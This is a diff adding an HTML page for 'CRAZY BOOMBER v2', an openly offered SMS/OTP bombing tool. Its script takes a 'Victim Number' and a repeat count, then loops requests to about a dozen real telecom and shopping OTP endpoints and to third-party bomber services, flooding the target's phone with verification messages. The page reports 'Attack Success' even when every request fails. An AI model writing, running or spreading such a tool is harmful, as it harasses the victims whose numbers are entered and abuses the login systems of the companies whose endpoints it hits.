@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRAZY BOOMBER v2 - LMNx9</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&amp;display=swap" rel="stylesheet">
+    <style>
+        body {
+    background-color: #000;
+    font-family: 'Orbitron', sans-serif;
+    color: #ff0000;
+    overflow: hidden;
+}
+.digital-card {
+    background: rgba(0, 0, 0, 0.8);
+    border: 1px solid rgba(255, 0, 0, 0.3);
+    box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+    border-radius: 15px;
+    backdrop-filter: blur(10px);
+}
+.digital-input {
+    background: rgba(0, 0, 0, 0.5);
+    border: 1px solid rgba(255, 0, 0, 0.3);
+    color: #ff0000;
+    box-shadow: inset 0 0 10px rgba(255, 0, 0, 0.2);
+}
+.digital-input:focus {
+    outline: none;
+    border: 1px solid rgba(255, 0, 0, 0.6);
+    box-shadow: inset 0 0 15px rgba(255, 0, 0, 0.4);
+}
+.neon-glow {
+    text-shadow: 0 0 5px #ff0000, 0 0 15px #ff0000, 0 0 30px #ff0000;
+}
+.loading-spinner {
+    border: 4px solid rgba(255, 0, 0, 0.3);
+    border-top: 4px solid #ff0000;
+}
+.response-default, .response-success {
+    color: #ff0000;
+    text-shadow: 0 0 5px #ff0000, 0 0 15px #ff0000, 0 0 30px #ff0000;
+    animation: glow 1.5s infinite alternate;
+}
+.response-failure {
+    color: #ff416c;
+    text-shadow: 0 0 5px #ff416c, 0 0 15px #ff416c, 0 0 30px #ff416c;
+    animation: glow 1.5s infinite alternate;
+}
+@keyframes glow {
+    0% { opacity: 1; }
+    100% { opacity: 0.7; }
+}
+#particles-js {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+}
+
+        .button-click-effect {
+            animation: clickEffect 0.3s ease-out;
+        }
+        @keyframes clickEffect {
+            0% { transform: scale(1); }
+            50% { transform: scale(0.9); }
+            100% { transform: scale(1); }
+        }
+    </style>
+
+<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.16 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.relative{position:relative}.z-10{z-index:10}.mx-auto{margin-left:auto;margin-right:auto}.mb-4{margin-bottom:1rem}.mb-6{margin-bottom:1.5rem}.mt-4{margin-top:1rem}.mt-5{margin-top:1.25rem}.mt-6{margin-top:1.5rem}.flex{display:flex}.hidden{display:none}.min-h-screen{min-height:100vh}.w-96{width:24rem}.w-full{width:100%}.items-center{align-items:center}.justify-center{justify-content:center}.rounded-lg{border-radius:0.5rem}.rounded-xl{border-radius:0.75rem}.border-2{border-width:2px}.border-\[0\.5px\]{border-width:0.5px}.border-\[\#ff0000\]{--tw-border-opacity:1;border-color:rgb(255 0 0 / var(--tw-border-opacity, 1))}.bg-black{--tw-bg-opacity:1;background-color:rgb(0 0 0 / var(--tw-bg-opacity, 1))}.p-2{padding:0.5rem}.p-8{padding:2rem}.py-1{padding-top:0.25rem;padding-bottom:0.25rem}.text-center{text-align:center}.text-2xl{font-size:1.5rem;line-height:2rem}.text-base{font-size:1rem;line-height:1.5rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.font-bold{font-weight:700}.font-medium{font-weight:500}.font-semibold{font-weight:600}.text-\[\#ff0000\]{--tw-text-opacity:1;color:rgb(255 0 0 / var(--tw-text-opacity, 1))}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.duration-300{transition-duration:300ms}.hover\:bg-\[\#ff0000\]:hover{--tw-bg-opacity:1;background-color:rgb(255 0 0 / var(--tw-bg-opacity, 1))}.hover\:text-black:hover{--tw-text-opacity:1;color:rgb(0 0 0 / var(--tw-text-opacity, 1))}.focus\:outline-none:focus{outline:2px solid transparent;outline-offset:2px}</style></head><body class="flex items-center justify-center min-h-screen">
+    <!-- Particle Effect Container -->
+    <div id="particles-js"><canvas class="particles-js-canvas-el" width="1377" height="963" style="width: 100%; height: 100%;"></canvas></div>
+
+    <!-- Main Content -->
+    <div class="text-center w-96 p-8 rounded-xl digital-card relative z-10">
+        <h1 class="text-2xl font-bold neon-glow glitch typing-animation">CRAZY BOOMBER v2</h1>
+        <h1 class="text-1xl font-bold neon-glow glitch typing-animation">Developer : Limon Hossain</h1>
+        <style>
+            ::placeholder {
+                color: #ff0000 !important; /* Red color */
+                opacity: 1; 
+            }
+        </style>
+        <div class="mb-4 mt-6">
+            <input type="text" id="phoneNumber" placeholder="Victim Number +88" class="w-full p-2 text-sm digital-input rounded-lg border-2 border-[#ff0000] focus:outline-none">
+        </div>
+        <div class="mb-6">
+            <input type="number" id="amount" placeholder="Boombing Amount" class="w-full p-2 text-sm digital-input rounded-lg border-2 border-[#ff0000] focus:outline-none">
+        </div>        
+        <button onclick="sendOTP()" class="w-full py-1 rounded-lg bg-black text-base font-medium border-[0.5px] border-[#ff0000] text-[#ff0000] hover:bg-[#ff0000] hover:text-black transition-all duration-300 button-click-effect">
+            START ATTACK
+        </button>        
+        <br><br>
+        <p id="responseMessage" class="mt-5 font-semibold response-default">
+            <a href="https://t.me/TEAM_LMNx9" target="_blank" class="mt-5 font-semibold response-default">
+              JOIN TELEGRAM CHANNEL
+            </a>
+          </p>
+        <div id="loadingSpinner" class="loading-spinner mx-auto mt-4 hidden"></div>
+    </div>
+
+    <!-- Particles.js Library CDN -->
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+
+   <!-- Particle Configuration Script -->
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        particlesJS("particles-js", {
+            particles: {
+                number: {
+                    value: 100,
+                    density: {
+                        enable: true,
+                        value_area: 800
+                    }
+                },
+                color: {
+                    value: "#ff0000"
+                },
+                shape: {
+                    type: "circle",
+                    stroke: {
+                        width: 0,
+                        color: "#000000"
+                    }
+                },
+                opacity: {
+                    value: 0.7,
+                    random: true,
+                    anim: {
+                        enable: true,
+                        speed: 1,
+                        opacity_min: 0.1,
+                        sync: false
+                    }
+                },
+                size: {
+                    value: 3,
+                    random: true,
+                    anim: {
+                        enable: true,
+                        speed: 2,
+                        size_min: 0.1,
+                        sync: false
+                    }
+                },
+                line_linked: {
+                    enable: true,
+                    distance: 150,
+                    color: "#ff0000",
+                    opacity: 0.4,
+                    width: 1
+                },
+                move: {
+                    enable: true,
+                    speed: 3,
+                    direction: "none",
+                    random: false,
+                    straight: false,
+                    out_mode: "out",
+                    bounce: false,
+                    attract: {
+                        enable: false,
+                        rotateX: 600,
+                        rotateY: 1200
+                    }
+                }
+            },
+            interactivity: {
+                detect_on: "canvas",
+                events: {
+                    onhover: {
+                        enable: true,
+                        mode: "bubble"
+                    },
+                    onclick: {
+                        enable: true,
+                        mode: "push"
+                    },
+                    resize: true
+                },
+                modes: {
+                    grab: {
+                        distance: 140,
+                        line_linked: {
+                            opacity: 1
+                        }
+                    },
+                    bubble: {
+                        distance: 200,
+                        size: 6,
+                        duration: 2,
+                        opacity: 0.8,
+                        speed: 3
+                    },
+                    repulse: {
+                        distance: 200,
+                        duration: 0.4
+                    },
+                    push: {
+                        particles_nb: 4
+                    },
+                    remove: {
+                        particles_nb: 2
+                    }
+                }
+            },
+            retina_detect: true
+        });
+    });
+
+        async function sendRequest(url, method = 'GET', data = null) {
+            try {
+                let options = {
+                    method: method,
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                };
+                if (data) {
+                    options.body = JSON.stringify(data);
+                }
+                let response = await fetch(url, options);
+                console.log(`API: ${url}, Status: ${response.status}`);
+                if (response.status >= 200 && response.status < 300) {
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                console.warn(`API Error: ${url}`, error);
+                return false;
+            }
+        }
+
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        
+        async function sendOTP() {
+            let phone = document.getElementById('phoneNumber').value;
+            let amount = document.getElementById('amount').value;
+            let responseMessage = document.getElementById('responseMessage');
+            let loadingSpinner = document.getElementById('loadingSpinner');
+            
+            if (!phone || !amount) {
+                responseMessage.innerHTML = '<span class="response-failure">Invalid Number & Amount..!</span>';
+                return;
+            }
+
+            let phonePattern = /^[0-9]{11}$/;
+            if (!phone.match(phonePattern)) {
+                responseMessage.innerHTML = '<span class="response-failure">Enter 11-Digit Number..!</span>';
+                return;
+            }
+
+            if (amount <= 0) {
+                responseMessage.innerHTML = '<span class="response-failure">Enter Valid Digit Amount..!</span>';
+                return;
+            }
+
+            // Show loading spinner
+            loadingSpinner.classList.remove('hidden');
+            responseMessage.innerHTML = '<span class="response-default">Please Wait.. Attacking...</span>';
+
+            let apis = [
+                { url: `https://lmnx9.xyz/boom/free.php?number=${phone}&amount=${amount}`, method: 'GET' },
+                { url: `https://cokestudio23.sslwireless.com/api/check-gp-number`, method: 'POST', data: { msisdn: phone } },
+                { url: `https://weblogin.grameenphone.com/backend/api/v1/otp`, method: 'POST', data: { msisdn: phone } },
+                { url: `https://apix.rabbitholebd.com/appv2/login/requestOTP`, method: 'POST', data: { mobile: phone } },
+                { url: `https://api.osudpotro.com/api/v1/users/send_otp`, method: 'POST', data: { mobile: phone, deviceToken: "web", language: "en", os: "web" } },
+                { url: `https://fundesh.com.bd/api/auth/generateOTP?service_key=`, method: 'POST', data: { msisdn: phone } },
+                { url: `https://api.swap.com.bd/api/v1/send-otp`, method: 'POST', data: { phone: phone } },
+                { url: `https://api.bd.airtel.com/v1/account/login/otp`, method: 'POST', data: { phone_number: phone } },
+                { url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phone}`, method: 'GET' },
+                { url: `https://eshop-api.banglalink.net/api/v1/customer/send-otp`, method: 'POST', data: { type: 'phone', phone: phone } },
+                { url: `https://cherykuwait.com/topbomb.php?phone=${phone}&amount=${amount}`, method: 'GET' },
+                { url: `https://tcsbomberai.vercel.app/api/smsbomber?phone=${phone}`, method: 'GET' }
+            ];
+
+            let successCount = 0;
+            let totalRequests = amount;
+
+            for (let i = 0; i < totalRequests; i++) {
+                let results = await Promise.all(apis.map(api => sendRequest(api.url, api.method, api.data)));
+                successCount += results.filter(res => res === true).length;
+                await delay(1000);
+            }
+
+            loadingSpinner.classList.add('hidden');
+
+            if (successCount > 0) {
+                responseMessage.innerHTML = `<span class="response-success">- LMNx9 Crazy Boomber v2 Attack Success..!</span>`;
+            } else {
+                responseMessage.innerHTML = '<span class="response-failure">- LMNx9 Crazy Boomber v2 Attack Success..!</span>';
+            }
+        }
+    </script>
+
+</body></html>
